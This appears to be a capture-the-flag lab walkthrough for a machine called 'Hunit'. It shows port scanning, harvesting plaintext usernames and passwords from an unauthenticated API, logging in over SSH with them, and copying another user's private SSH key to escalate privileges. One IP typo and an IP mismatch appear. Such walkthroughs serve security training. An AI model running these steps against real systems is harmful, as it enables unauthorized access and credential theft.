# Hunit
# date 8/8/2023
# ip 192.168.217.125


# nmap

sudo nmap   192.168.79.125 -p- -sS -sV

Not shown: 65531 filtered ports
PORT      STATE SERVICE    VERSION
8080/tcp  open  http-proxy
12445/tcp open  unknown
18030/tcp open  http       Apache httpd 2.4.46 ((Unix))
43022/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)

# 192.168.217.125:8080

Checking the source page for any haiku reveals a comment refer to API.
<a href="http://localhost:8080/api/">List all</a>

http://192.168.217.125:8080/api/


curl http://1192.168.217.125:8080/api/

Runnining curl against the user API directory reveals sensitive information regarding each user.

curl http://192.168.217.125:8080/api/user/


# Compiling the passwords and login names of each provides us with a users and password list.

Users
 rjackson
 dademola
 jvargas
 jsanchez

Pass
 yYJcgYqszv4aGQ
 ExplainSlowQuest110
 KTuGcSW6Zxwd0Q
 d52cQ1BzyNQycg
 OuQ96hcgiM5o9w

 Inspecting our found information further we find that all the users are 'Editors' and David is a admin. The password associated with David is also greatly different from the rest. I then tried a manual login with SSH.

ssh -p 43022 dademola@192.168.217.125

 Valid credentials: dademola:ExplainSlowQuest110

 # priv esc
 Looking for other users in /home/ we see we have the Git user. Checking contents of the directory we also have a id_rsa key.


 scp -P 43022 dademola@192.168.217.125:/home/git/.ssh/id_rsa